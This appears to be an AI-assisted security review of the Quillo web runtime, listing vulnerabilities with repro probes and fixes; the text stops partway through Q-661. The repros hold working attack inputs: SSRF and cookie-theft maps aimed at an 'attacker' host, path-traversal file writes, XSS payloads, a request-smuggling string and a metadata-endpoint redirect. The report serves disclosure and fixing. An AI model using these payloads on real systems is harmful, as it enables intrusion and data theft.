# Feedback from a security review of Quillo: the runtime, the server, the browser runtime, the sandbox, the databases, channels and the dev tools

| | |
|---|---|
| App | None: about 90 probe programs of 1 to 20 lines, driven with `curl`, raw sockets (Python), a WebSocket client, headless Chrome ([feedback/tools/drive.mjs](../tools/drive.mjs)), a fake upstream and a fake proxy, the language server over stdio, and a local PostgreSQL 17 (a scratch database and role, dropped afterwards) |
| Quillo | `quillo 0.7.0-dev (98b5b75, 2026-11-03)`, a release build of main. The build also held another session's uncommitted edits (at the start: `src/ast.rs`, `builtins.rs`, `check.rs`, `parser.rs`, `server.rs`; later also `describe.rs`, `httpd.rs`, `interp.rs`, `tests/routes.rs`). The one difference seen: a group middleware's `false` gives 403 here, and passes at HEAD (Q-651). Line numbers are HEAD's (`git show HEAD:`) |
| Model | Claude (Opus 5.5): seven reviewers in parallel, one per area. The main session reran the most severe probes itself (marked "rerun" below) |
| Tested with | `quillo check` and `quillo run` on each probe, on 127.0.0.1 only; SECURITY.md's promises and USERGUIDE.md's sections on files, uploads, sessions, scripts, services, channels and media; the source of every area |

No Quillo source was changed, and `feedback/INDEX.md` and `feedback/repros/` were not touched. Each repro is in its issue's section. Numbers start at Q-640 so the reports in progress have room after Q-633.

Several things are solid. Text and attribute escaping, `javascript:` in URL attributes, cross-site form posts, the session cookie, version-3 service signatures, SQL parameter binding, PostgreSQL TLS modes, path traversal through `..` and links, and request smuggling with `Content-Length` and `Transfer-Encoding` all held up. See "What held up" at the end.

The holes are mostly where one feature's guard does not reach a neighbouring path:
- a `for [...]` server fn is checked on service calls but not on the browser's RPC path (Q-641);
- `publish` is guarded on media, but watching is not (Q-642);
- tenants separate sessions and live data, but not channels or streams (Q-643, Q-644);
- the sandbox refuses `http`, but a map with a `$site` key makes HTTP calls with no effect at all (Q-640);
- `javascript:` is refused in every URL sink but `navigate()` (Q-645).

## Summary

| ID | Problem | Severity | Checked by |
|---|---|---|---|
| Q-640 | Any map with a `$site` key turns a method call into an HTTP POST to the map's `$url`: a way out of `run_script`, SSRF from visitor JSON, and in apps cookie theft and a file written outside the project | critical | rerun |
| Q-641 | `server fn f() for ["billing"]` is callable by anyone at `/_quillo/rpc/f`; `for` is checked on service calls only | high | rerun |
| Q-642 | Anyone can watch any media stream, private calls included, from any tenant and with no session: `media.on` guards publishing only | high | rerun |
| Q-643 | Any page can send frames into any stream (an RTP-only camera too) and make new streams, each holding up to 600 MiB that is never freed | high | rerun |
| Q-644 | Channels are not separated by tenant: a user on tenant `evil` hears and writes to tenant `acme`'s `lobby` | high | rerun |
| Q-645 | `navigate(url)` runs `javascript:` URLs when no component reads `url()`: a `?next=` after sign-in is XSS | high | Chrome |
| Q-646 | `<style>` and `<script>` inside `<svg>` or `<math>` are escaped as HTML raw text, but parsed there as markup: XSS from a CSS colour | high | Chrome |
| Q-647 | A stream waiting on a slow reader inside a SQLite `db.transaction` lets other requests run inside it: their committed writes are rolled back | high | probe |
| Q-648 | `run_script` takes SAFE names from the program's globals: a program's own `fn upper` runs from a script with the program's effects | medium | probe |
| Q-649 | `http.*` lets ureq follow redirects: `Authorization` and other secret headers go to another port or host, a `file:` redirect panics, `redirects: N` follows N-1 | medium | probe |
| Q-650 | `public_only: true` checks only the first URL when `HTTP_PROXY` is set: a redirect reaches `169.254.169.254` | medium | probe |
| Q-651 | Group middleware that returns a map (`{ error: "bad key" }`) or nothing lets the route run; at HEAD `false` and errors pass too | medium | probe |
| Q-652 | An `accept_calls` `check` that returns null (an `if` with no `else`) accepts the caller | medium | probe |
| Q-653 | The language server runs `cargo check` on opening a `.qwer` file, so opening an untrusted repository runs its dependencies' `build.rs` | medium | probe |
| Q-654 | Chunked framing takes a bare LF, CR or NUL in a chunk extension or trailer, and an empty `Transfer-Encoding`: requests can be smuggled past some proxies | medium | probe |
| Q-655 | `/_quillo/ready` is public: it lists internal service addresses, and holds a worker 30 s per dead address (6 requests stall a 4-worker server) | medium | probe |
| Q-656 | `files()` serves `.qwe`, `.qwer` and `.rs` source as `lib.QWE` on macOS and Windows | medium | probe |
| Q-657 | `file("public/" + path)`, the guide's and `quillo new`'s static route, serves `.env`, `.git/config` and `.qwe` files | medium | probe |
| Q-658 | `image.convert` writes over `.env`, `main.qwe` and the database: it skips the program-files check `write_file` has | medium | probe |
| Q-659 | A replica that fails to open puts its whole URL, password included, in `db.open`'s error | medium | probe |
| Q-660 | JSON parsing takes 80 to 100 times the body's size: one 10 MB `request.json` peaks at 1.05 GB | medium | probe |
| Q-661 | Q-592's fix covers parsing only: `json.stringify`, `==` and dropping a value nested 50,000 deep (built by a loop) crash the server with no log | medium | probe |
| Q-662 | The guide's "columns from a map" recipe, fed `request.form`, lets a visitor set `is_admin` | medium, docs | probe |
| Q-663 | No Host check on loopback or under `--watch`: DNS rebinding reaches server fns and `/_quillo/dev` | medium | probe (no real browser) |
| Q-664 | A remembered service answer is given to any caller presenting the same call id, for any function, before the `for` check | low-medium | probe |
| Q-665 | A visitor's access token works as a service caller's: the caller name falls back to `azp` and `sub` | low-medium | probe |
| Q-666 | Live topics are not authorised: anyone follows `acme@dm:alice:bob` from another tenant and sees when Bob writes Alice | low-medium | rerun |
| Q-667 | The runtime takes up any `[data-qi]` element as an island and puts a string `children` prop in as HTML: sanitised visitor HTML that keeps `data-*` becomes script | low-medium | Chrome |
| Q-668 | Values in `css` templates and style maps are not escaped as CSS: a visitor's colour adds rules (attribute-reading selectors, outside URLs) | low-medium | probe |
| Q-669 | A page made from `request.cookies` or the `cookie`/`authorization` headers gets no `Cache-Control: private` or `Vary` | low | probe |
| Q-670 | A function returned by `run_script` runs later with no step or size limit | low | probe |
| Q-671 | `files()`'s folder redirect for `//docs` is `Location: //docs/`, a redirect to another host | low | probe |
| Q-672 | A request body sent 1 byte every 25 s holds its connection forever, and nothing caps connections in all or per address | low | probe, partly reading |
| Q-673 | `quillo install --example --force` writes the catalog's extra files with no hash check, over `main.qwe` too | low | probe |
| Q-674 | Image decoding peaks at 1.5 to 2 times the 512 MiB cap, and four run at once | low | probe |
| Q-675 | SQLite files are made with the umask's mode (0644 here): readable by every local user | low | probe |
| Q-676 | SECURITY.md sends vulnerability reports to `github.com/wisp-one/quillo`, not `quillolang/quillo`, and does not list `/_quillo/ready` or `/_quillo/live` as public | docs | reading |

## Seen again

These were reported before, are still open at HEAD, and are security holes:

| ID | Where it bit | Severity |
|---|---|---|
| Q-581 | PostgreSQL connections go back to the pool with their session state. One request's `set role` and `set_config('app.user', who, false)` were the next, unrelated request's: an anonymous `GET /mine` read Alice's row-level-security rows as Alice. This bypasses the usual multi-tenant RLS setup. There is no `DISCARD ALL` or `COM_RESET_CONNECTION` anywhere in `src/` | critical |
| Q-580 | `db.exec("begin")` then a failing statement left the pooled PostgreSQL connection aborted (25P02). Every later request on it answered 500 until restart: one route a visitor can reach makes a denial of service | high |
| Q-594 | One page that joins a channel and never reads took the server from 7 to 4,095 threads with reliable 10 KB broadcasts. Then `thread::spawn` failed and requests answered 500 | high |
| Q-596 | Under the default shared secret, a fake billing service answering `{"ok": true}` with no signature made `/ship/7` print `SHIPPED order 7` (service.rs:1156, `!kid.is_empty()`) | medium |
| Q-593 | A continuation frame of length `0xFFFF…` still panics the channel thread (`capacity overflow`, ws.rs:196). The peer stays listed and hears nothing | medium |
| Q-579 | Q-647 is a second way in, with no PostgreSQL needed | high |
| Q-604 | Q-643: a page's frames fill a stream's 600-frame buffer with no byte cap | |
| Q-606 | `--max-compute 300ms` did not stop `sum(map(range(0, 10000000), (x) => ...))`, which ran 1.34 s. The same work in a `for` loop was stopped at 355 ms: the time is checked only between statements (httpd.rs `over_time`) | low-medium |

## New issues

### Q-640. Any map with a `$site` key turns a method call into an HTTP POST

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | critical | reading the interpreter | rerun by the main session |

`site shop = "https://..."` makes a map with `$site` and `$url`. `eval_call` treats every map that holds `$site` as a site (interp.rs:3099), and `x.name(args)` on it becomes `__site_call`. That function needs no effect (`builtin_effect` gives it 0, ast.rs:135-161), so the sandbox's empty effect set, `with` and `--policy` all let it through. `sites::call` (sites.rs:86) POSTs to `{$url}/_quillo/rpc/{name}` and checks nothing about `$url`. The checks of `site x = ...` (no `?`, no `#`) happen only at the declaration. Ending `$url` with `#` or `?x=` picks the whole path.

```quillo
print(run_script("{\"$site\": \"x\", \"$url\": \"http://127.0.0.1:47490/anything#\"}.f(1)", {}))
```

The listener got `POST /anything` with body `[1]`, and the script printed its `{"ok": "REACHED"}`. A non-JSON answer comes back as its first 200 characters, inside the error text.

The same works without `run_script`. Visitor JSON is a map, and the site branch runs before builtin methods. So `request.json.keys()` on `{"$site": "x", "$url": "http://10.0.0.5/internal#"}` makes the server POST there:

```quillo
route POST /count = `fields: ${request.json.keys().len()}`
```

This is blind SSRF. A route that shows the result gives the answer too.

In a desktop or phone app, or with `QUILLO_SITE_COOKIES=1`, the site's saved cookies are sent along:
- **Cookie theft:** with `{"$site": "shop", "$url": "http://attacker/"}`, shop's session cookie went to the attacker.
- **File write:** the jar's file is `.quillo/sites/{$site}.json` (sites.rs:45), and the name is not cleaned. `"$site": "../../../../escaped"` wrote a JSON file four folders above the project, with the attacker server's `Set-Cookie` values in it. Reading works the same way: any JSON file of that shape is sent as cookies.

**Fix:**
- A site is a value only `site x = ...` can make: a `Value::Site(Arc<SiteRef>)`, or a map tagged by something JSON, map literals and `merge` cannot produce.
- Give `__site_call` the `http` effect.
- In `jar_file`, take only identifier names.
- Check the URL in `call` as `declare` does.
- Tests: a forged `$site` map in `run_script` is refused; `request.json.keys()` on such a map gives its keys; a site name with `..` is refused.

### Q-641. `server fn f() for ["billing"]` is callable by anyone at `/_quillo/rpc/f`

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | reading `server.rs` | rerun |

`for` names the services that may call a function. It is checked in `run_call` (service.rs:1427-1432), the `/_quillo/service/` path. The browser's path, the rpc branch of server.rs (HEAD 1020-1056), checks the content type, `cross_site` and `server_fns`, but never `fn_callers`. A program not started with `--as-service` exposes these functions to curl. That includes an app that takes callbacks from its services, the pattern tests/feedback38.rs:291 uses. `cross_site` lets a request with no Origin through.

```quillo
accept_calls { keys: { billing: "0123456789abcdef0123456789abcdef" }, shared: false }
server fn add_credit(user: int, cents: int) for ["billing"] = { user: user, credited: cents, caller: request.caller }
route GET / = "hi"
```

```
$ quillo check main.qwe
main.qwe: ok (1 route, 1 function, 0 components)
$ curl -X POST 127.0.0.1:47495/_quillo/rpc/add_credit -H 'content-type: application/json' -d '[1, 1000000]'
{"ok":{"user":1,"credited":1000000,"caller":null}}
```

With a database insert in the function, `GET /` then showed `credits: 1000000`. Services run in the same process answered 404 on both paths, so they are not affected.

**Fix:** in the rpc branch, right after the `server_fns` lookup, answer 404 when `fn_callers` has the name ("called by services only"). Add a test for the browser path. `quillo check` can say in its summary that a `for` function has no browser path.

### Q-642. Anyone can watch any media stream, from any tenant and with no session

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | reading `wt.rs`, probe | rerun |

The `["v", name]` message goes to `media::watch` (wt.rs:232, media.rs:191) with no check. `media.on` has `publish` only, and stream names are global, not per tenant. The guide's video-call example guards only who sends (`media.on("call:*", { publish: ... })`, then `call:${room}:${me}`).

```quillo
tenant_from("example.test")
media.rtp("call:alice:bob", { video: 47651 })
media.on("call:*", { publish: (peer) => peer.session.user != null })
route GET /streams = media.streams()
```

An anonymous visitor on `evil.example.test` did the following:
1. Sent `POST /_quillo/wt-ticket` with no cookie.
2. Opened `/_quillo/wt?t=...`.
3. Sent `["v","call:alice:bob"]`.

Then RTP went to 47651. Observed: `viewers: 1`, and binary frames `...call:alice:bob...SECRET-VIDEO-FRAME-0` to `-3`.

**Fix:**
- Add `media.on(name, { publish, watch })`, with `watch(peer)` run as a channel `join` is, before `media::watch`.
- A stream with `publish` and no `watch` refuses watchers. A loud warning is the least, along with a changed call example.
- Key streams by tenant, as live topics are (`tenant@name`).

### Q-643. Any page can send into any stream, and make new ones that are never freed

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | reading, probe | rerun (injection); memory by the reviewer |

`frame_from_page` (wt.rs:1194) checks only that the page joined `media:<name>`. A join to a channel no `channel.on` names is always a yes (wt.rs:580). So without a `media.on` for the name, any page joins and its frames are taken, even into a camera fed by RTP only.

`media.rs:143` and `:609` make a stream for any name, from a frame or a `["v", name]`. `media.rs:166` keeps 600 frames of up to 1 MiB each, with no byte cap, and nothing removes a stream.

```quillo
media.rtp("lobbycam", { video: 47653 })
route GET /streams = media.streams()
```

The attacker's `["j","media:lobbycam"]` was answered `true`, and the viewer received `...eATTACKER-INJECTED-KEYFRAME`. A frame to `media:fake-news` made a stream that `media.streams()` lists. 150 frames of 1 MiB into one name took the process from 16 MB to 157 MB, and it stayed after the attacker left (see Q-604).

**Fix:**
- Refuse joins to `media:*` unless a `media.on` names the stream with `publish`.
- Never make a stream from a page's frame or a `"v"`.
- Cap a stream's buffer in bytes, cap streams pages can make, and drop idle ones.

### Q-644. Channels are not separated by tenant

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | probe | rerun |

Rooms are keyed by name only (wt.rs:257). `broadcast_here` (wt.rs:802), `send_here` and `peers_here` (wt.rs:829) ignore the peer's tenant. The guide says tenants have their own data, and live topics and sessions are kept per tenant, but channels are not.

```quillo
tenant_from("example.test")
channel.on("lobby", (msg, peer) => {
    channel.broadcast("lobby", { from: peer.session.user, tenant: tenant(), text: msg.text })
}, { join: (peer) => peer.session.user != null })
route GET /login/:name = { set_session({ user: name }); "ok" }
```

Alice signed in on `acme`, Mallory on `evil`, and both joined `lobby`. Mallory heard `["m","lobby",{"from":"alice","tenant":"acme","text":"acme board: Q3 numbers are bad"}]`, and could write into acme's room.

**Fix:**
- Key rooms, inboxes and `joining()` by (tenant, channel). `channel.broadcast`, `send` and `peers` use `it.tenant()`.
- The `--split` relay carries the tenant.
- Mounted programs probably need the same (from reading: tickets are not bound to the mount point, wt.rs:855-866).

### Q-645. `navigate(url)` runs `javascript:` URLs

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | reading `runtime.js`, headless Chrome | Chrome |

When nothing on the page calls `url()` (`Nav.on` is false), `navigate` does `location.assign(withBase(to))` with no check (runtime.js:5233-5238). `withBase` only prefixes paths starting with `/`. Every other URL sink is guarded:
- `setProp` refuses `javascript:` in URL attributes;
- `setField` and `guardArgs` refuse it for `location.href = ...` and page-function arguments;
- on the `Nav.on` path, `pushState` throws, which makes it safe by accident.

```quillo
component Login(next: str) {
    state done = false
    <div><button id="b" @click={() => { done = true; navigate(next) }}>Sign in</button></div>
}
route GET / = <html><head><title>t</title></head><body><Login next={request.query.next ?? "/"}/></body></html>
```

Open `/?next=javascript%3Awindow.__pwn%3Ddocument.domain%3Bvoid%200` and click: `__pwn` went from null to `"127.0.0.1"`. The same code is also an open redirect to any `https://` site.

**Fix:**
- At the top of `navigate()`, before the `Nav.on` branch, refuse `scriptURL(to)` with a Quillo error, as `guardArgs` does. Better: take only paths and http(s) URLs.
- Give the server's `navigate`/`redirect` the same rule.
- The guide's sign-in example can check `next` starts with one `/`.

### Q-646. `<style>` and `<script>` inside `<svg>` or `<math>` let markup through

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | high | reading `render_tag_into`, headless Chrome | Chrome |

In HTML, `<style>` and `<script>` are raw text, so `render_tag_into` (interp.rs, the `<script>` branch at 4105, `f.style` at 4122) only turns `</` into `<\/`, and a JSON value has `<` escaped. Inside `<svg>` or `<math>`, the browser parses both as ordinary markup and decodes entities:
- in `<style>`, `<img onerror>` is a real element;
- in `<script>`, `&quot;` ends a JSON string.

`quillo check` says ok, and the guide says the content "cannot end the element early".

```quillo
route GET /svgstyle = <html><body><svg width="10" height="10"><style>{css`circle { fill: ${request.query.q} }`}</style><circle r="5"/></svg></body></html>
route GET /svgscript = <html><body><svg><script>{"window.__v = "}{request.query.q}</script></svg></body></html>
route GET /mathstyle = <html><body><math><style>{request.query.q}</style></math></body></html>
```

These three ran script in Chrome:
- `/svgstyle?q=red}<img src=x onerror=window.__pwn=1>`
- `/svgscript?q=&quot;;window.__pwn=2;//`
- `/mathstyle?q=<img src=x onerror=window.__pwn=3>`

A chart or icon component with `<svg><style>{css`.bar{fill:${color}}`}</style>` is a realistic way in.

**Fix:**
- Pass an "in foreign content" flag down while rendering `svg`/`math` children, cleared at `foreignObject` and MathML's text points. Under it, render `style` and `script` children with the ordinary `escape()`: the browser decodes it back to the same text there.
- Or refuse non-literal children of `<style>`/`<script>` inside svg/math, at load and in `quillo check`.
- Do the same in runtime.js where it builds these elements.

### Q-647. A slow reader inside a SQLite transaction lets other requests run in it

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, data, security | high | reading `httpd.rs`/`db.rs`, probe | probe |

SQLite is one connection per database per process. `Interp::unlocked` (interp.rs:1525) does not pause a request while `sqlite_tx > 0`, but the stream's back-pressure path does: `ConnSink::write` → `writable()` → `wait_elsewhere` (httpd.rs:1580-1590). While it waits, other requests run their SQL on the same connection, inside the open transaction. Their own `db.transaction` becomes a savepoint in it. Q-579 is the same through a PostgreSQL query; this way needs only SQLite and a slow client.

```quillo
route GET /export.txt = stream(send => db.transaction(() => for row in db.query("select body from items") { send(row.body) }))
route POST /order = db.transaction(() => db.exec("insert into orders (who) values ('victim')"))
route GET /orders = db.query("select * from orders")
```

The attacker opened `/export.txt`, read 100 bytes and waited 6 s. Meanwhile, the victim's `POST /order` answered "order 1 placed", and `/orders` showed it. After the attacker disconnected, `/orders` was `[]`: the committed order was gone. Any visitor holds every other visitor's writes uncommitted for as long as they like.

**Fix:**
- While `sqlite_tx > 0`, no request may yield: back-pressure waits, `wait_elsewhere`, the PostgreSQL lanes (db.rs:666, 1291, 1909), live-cache waits. Either block in place, as `unlocked` does, or give an open SQLite transaction its own connection.
- `quillo check` can warn about `stream`/`send` inside `db.transaction`, as it does for `http`.
- Q-579's fix is the same change.

### Q-648. `run_script` reaches a program function named like a SAFE builtin

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | reading `script.rs` | probe |

script.rs:183-187 looks up each SAFE name in `it.globals`. It finds the program's own `fn upper`, a top-level `let len`, or an `import ... as upper`. `script_mask` (interp.rs:3527) then gives that function the program's effects, as its environment is not under the script's root. The guide says scripts do not reach the program's functions.

```quillo
fn upper(s) { write_file("pwned.txt", `script reached the program's upper with ${s}`); "done" }
print(run_script(`upper("from-script")`, {}))   // done
print(run_script(`"x".upper`, {}))              // done
print(read_file("pwned.txt"))                   // script reached the program's upper with x
```

**Fix:** take SAFE values from the builtin table, never from `it.globals`, and resolve method calls in a script the same way. Add a test with a program function that shadows a SAFE name.

### Q-649. `http.*` lets ureq follow redirects, past Quillo's own checks

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | reading `fetch.rs`, probe | probe |

Without a policy, the agent is built with ureq's redirects on (fetch.rs:335-339), and Quillo's own origin check (fetch.rs:431) runs only on hops it follows itself. That causes three problems.

**Secret headers go to another origin.** ureq's `SameHost` compares only the host and https, not the port, and strips only `cookie` and `authorization`. The guide says Authorization and Cookie are not sent to another origin. Here 47710 answers 302 to 127.0.0.1:47711:

```quillo
print(http.get("http://127.0.0.1:47710/to-other-port", { authorization: "Bearer SECRET", "x-api-key": "KEY123" }).body)
```

It printed `echo on 47711: auth=Bearer SECRET key=KEY123`, and POST→302 did the same. On another host, `x-api-key` goes along too.

**A `file:` redirect panics.** `Location: file:///etc/passwd` panics in ureq (unit.rs:252, `host_str().unwrap()`). `?? "fallback"` cannot catch it: the route answers 500, and a CLI program exits 1. The file is not read.

**`redirects: N` follows N-1.** `{ redirects: 1 }` fails on a one-hop chain, and the default of 5 follows 4.

**Fix:**
- Always build the agent with `.redirects(0)`, and follow every hop in `follow`, with its origin check and scheme filter (`join_url`).
- Drop `authorization`, `cookie` and the program's other headers on a cross-origin hop (origin = scheme, host and port), or document which are kept.
- Count hops as `hops > o.redirects`.
- Put `catch_unwind` around `send`, so that a panic in ureq becomes an error value.

### Q-650. `public_only: true` is bypassed by a redirect when `HTTP_PROXY` is set

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | reading, probe | probe |

With a proxy, `resolve_public` is not installed (fetch.rs:346), and only the first URL is checked (fetch.rs:372-377). ureq then follows a redirect through the proxy unchecked. The guide says each redirect is checked again.

```quillo
print(http.get("http://93.184.215.14/start", {}, { public_only: true }).body)
```

With `HTTP_PROXY=http://127.0.0.1:47712`, a fake proxy answering 302 to `http://169.254.169.254/latest/meta-data/`, the call returned 200 and `PROXY GOT http://169.254.169.254/latest/meta-data/`. A direct `http.get` of 169.254.169.254 is refused.

**Fix:** Q-649's change (Quillo follows every hop), with the address check on each hop's URL whenever `public_only` is set, as the policy path already does.

### Q-651. Group middleware that returns a map, or nothing, lets the route run

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | probe | probe (working tree); HEAD from reading |

`answer_with` (builtins.rs) lets the route go on for `Value::Nil | Value::Map(_)` in the working tree. At HEAD (line 2632), anything but a `Response` passes, `false` and error values included. Quillo programs answer JSON by returning a map, so the natural refusal passes:

```quillo
fn api_key(r) = r.headers["x-api-key"] == "k3y" ? r : { error: "bad api key" }
routes /api | api_key { route GET /secret = { data: "SECRET-API" } }
```

`curl /api/secret` with no key gave `{"data":"SECRET-API"}` and 200. `fn admins(r) { if session().user == "root" { return r } }` falls through to null and passes too, for GET and HEAD. `quillo check` says ok for both.

**Fix:** follow the 2026-11-03 decision (middleware fails closed):
- Go on only for the very request value the middleware was given (`Arc::ptr_eq` with `__request`), or `true`. Any other map is a 500 naming the middleware.
- Null refuses.
- `quillo check` warns about a middleware with a path that ends without a value.

### Q-652. An `accept_calls` `check` that returns null accepts the caller

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | reading `service.rs` | probe |

service.rs:1324-1336 refuses only `false` and an error value: `Ok(_) | Err(Ctrl::Return(_)) => {}`. An allow-list written as an `if` lets everyone else in:

```quillo
accept_calls { keys: { ... }, check: (caller) => {
    if caller.name == "mallory" { return false }
    if caller.name == "shop" || caller.name == "notify" { caller }
} }
```

A token with `sub: "carol"` called `ping` and got 200. Mallory was refused.

**Fix:** accept only `true` or a map, and give anything else a 403. Document it next to `check`.

### Q-653. Opening a `.qwer` file in an editor runs its dependencies' build scripts

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security | medium | reading `lsp.rs`, probe over stdio | probe |

On `textDocument/didOpen` and `didSave` of a `.qwer` file (lsp.rs:557-577), `check_rust` runs `cargo check` (native.rs:784) on a crate made from the file's `//! [dependencies]` header, as written. `cargo check` runs dependencies' `build.rs` and proc macros.

```rust
//! [dependencies]
//! helper = { path = "./helper" }
pub fn twice(n: i64) -> i64 { n * 2 }
```

`helper/build.rs` wrote a file. Sending only `initialize` and `didOpen` to `quillo lsp` made the file: `code ran as Ok("restiguay")`.

This is rust-analyzer's behaviour too, but the Quillo editors other than VS Code have no guard:
- **VS Code:** probably safe while a folder is untrusted. The extension declares no `untrustedWorkspaces`, so it is off in Restricted Mode (from reading).
- **Unguarded:** Neovim, Helix, Zed, Sublime, Emacs and JetBrains start `quillo lsp` on any `.qwer`.

`is_rust` also matches every `.rs` file.

**Fix:**
- Run Rust diagnostics on save only, never on open.
- Only in a folder the editor trusts: an initialization option that the VS Code extension sets from `workspace.isTrusted`, off by default elsewhere.
- Declare `capabilities.untrustedWorkspaces: { supported: "limited" }` in the extension.
- Match `.qwer` only.

### Q-654. Chunked framing takes bare LF, CR and NUL, and an empty `Transfer-Encoding`

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | raw sockets | probe |

`dechunk` (httpd.rs, Step::Size, 1951-1983) ends a size line only at CRLF and never checks the bytes after `;`. A proxy that ends the line at a bare LF and passes chunks through unchanged sees one request where Quillo sees two:

```
POST /body HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n2;\nxx\r\n42\r\n0\r\n\r\nGET /ip HTTP/1.1\r\nHost: smuggled.example\r\nX-Smuggled: yes\r\n\r\n\r\n0\r\n\r\n
```

Quillo answered three times. The second answer was `{"host":"smuggled.example","h":{...,"x-smuggled":"yes"}}`. `2;\r` and `2;\x00` work the same, and so does a bare LF in a trailer line.

`Transfer-Encoding: ,` (or empty) with `Content-Length` is read by length (`parse()`, about httpd.rs:1746). RFC 9112 §6.3 says that is a 400, and a proxy that sees any TE as chunked would disagree.

Limer ends extensions at LF but re-chunks bodies upstream, so quillolang.org behind it is not exposed this way.

**Fix:**
- In chunk extensions, take only token, `=`, `;`, SP/HTAB and quoted strings; refuse every CTL.
- Trailer lines may not hold a bare CR or LF.
- Any `transfer-encoding` header must parse to exactly `["chunked"]`, or 400.
- Add these cases to the fuzz/ framing target.

### Q-655. `/_quillo/ready` is public, lists internal addresses, and is a cheap way to stall a server

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| security, perf | medium | probe | probe |

`handle_internal` answers `ready` with no flag or token, and `report_at` (ready.rs) puts every service address in the answer:

```json
{"ready":false,"checks":{"service billing":{"http://10.9.8.7:8081":"down","http://192.168.77.3:9000":"down"}}}
```

`remote_ready` sets `.timeout(WAIT)` (1.5 s), but a dead address takes 30 s: ureq's connect timeout. Nothing shares a check in progress. With `--workers 4 --service-url billing=http://10.9.8.7:8081`, six concurrent `curl /_quillo/ready` made `/api` (a route that waits on `http`) take 29 s instead of 10 ms. Each ready request logged `503 (30000ms)`, and 60 s with two addresses.

**Fix:**
- Set `.timeout_connect(WAIT)`.
- Make the check single-flight: callers share the one in progress.
- Give the per-address detail only to loopback, a trusted proxy or the health token, and `{"ready": bool}` to others.
- List the endpoint in SECURITY.md (Q-676).

### Q-656. `files()` serves the program's source as `lib.QWE` on macOS and Windows

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium (macOS, Windows); none on Linux | probe | probe |

`files()`'s hidden rule (builtins.rs, about 1387) uses case-sensitive `ends_with(".qwe")`, and `native::is_rust` (native.rs:49) does the same for `.qwer`/`.rs`. `quillo serve` uses the same rule.

```quillo
route GET /*path = files("site", path)
```

With `site/lib.qwe` holding `let SECRET = "s3cr3t"`:
- `/lib.qwe` gives 404;
- `/lib.QWE` and `/lib.Qwe` give 200 with the source;
- `/lib.QWER` and `/plug.RS` give 200;
- dot paths held: `/.GIT/config` and `/%2egit/config` give 404.

On Windows, `lib.qwe.`, `lib.qwe ` and `lib.qwe::$DATA` likely open the file as well (from reading).

**Fix:** compare extensions lowercased, with trailing dots and spaces removed. Better: canonicalize the file that would be opened and test its real name.

### Q-657. `file("public/" + path)` serves `.env`, `.git` and `.qwe` files

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | probe | probe |

`file()` refuses only `..` and absolute paths. The guide's first static-files example and app/main.qwe, which `quillo new` copies, both use:

```quillo
route GET /static/*path = file("public/" + path)
```

`/static/.env` gave 200 `SECRET=hunter2`. `/static/%2eenv`, `/static/.git/config` and `/static/x.qwe` all gave 200.

**Fix:**
- Change the template and the guide to `files("public", path)`, which hides dot segments and the program's files.
- Have `file()` apply the same rule (case-insensitively, Q-656) when its path comes from a route parameter, or document loudly that it does not.

### Q-658. `image.convert` writes over `.env`, `main.qwe` and the database

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | reading `imaging.rs` | probe |

imaging.rs:235-238 checks the destination with `local_path` only, and never calls `own_file`. That skips the Q-361 protection `write_file`, `delete_file` and `save_upload` have.

```quillo
print(write_file(".env", "x"))                                // refused
print(image.convert("tiny.png", ".env", { format: "png" }))     // { width: 4, height: 4 }
print(image.convert("tiny.png", "main.qwe", { format: "png" })) // { width: 4, height: 4 }
```

Both files then start with `\x89PNG`. With `--reload`, the damaged main.qwe is reloaded. A route whose destination name comes from the visitor makes this a remote write.

**Fix:** call `own_file(it, &dest, true)` before converting. Check every other builtin that writes a file for the same call.

### Q-659. A failed replica's URL, password included, is in `db.open`'s error

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| silent, security | medium | probe | probe |

db.rs:1078 is `Err(format!("replica {}: {}", u, e))`, with the whole URL. `db.connect`'s error leaves the URL out, as the guide promises.

```quillo
db.open(env("DATABASE_URL"), { replicas: ["postgres://app:S3cretPassw0rd@127.0.0.1:47599/x"] }) | unwrap
```

This prints `... unwrap of an error: db: replica postgres://app:S3cretPassw0rd@127.0.0.1:47599/x: error connecting to server: Connection refused` to the log.

**Fix:** label the replica with `target_label` (db.rs:1164): scheme, host, port and database, with no user or password. Check the other `format!`s of connection URLs.

### Q-660. JSON parsing takes 80 to 100 times the body's size

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| perf, security | medium | measuring RSS | probe |

`request.json` goes through serde_json and then `Value::from_json`. So does every `http.*` answer, always: fetch.rs:747 parses `json` even when the program reads only `.body`. Measured:
- a visitor's 10 MB body (the default `--max-body`) through `request.json` peaked at 1.05 GB, for one request;
- an 8 MB `[0,0,...]` answer to `http.get` peaked at 633 MB, against 12 MB for a baseline run;
- at the 64 MiB body cap that is about 5 GB, and a gzip answer reaches the cap from about 64 KB on the wire.

**Fix:**
- Parse `json` lazily, or only for a JSON content type.
- Deserialize straight into `Value`.
- Give parsing an item budget, for example the body's length in values. A body of tiny values is the costly case.

### Q-661. Q-592's fix covers parsing only: other code over nested values still crashes the server

| Kind | Severity | Detected by | Checked |
|---|---|---|---|
| loud, crash | medium | probe | probe |

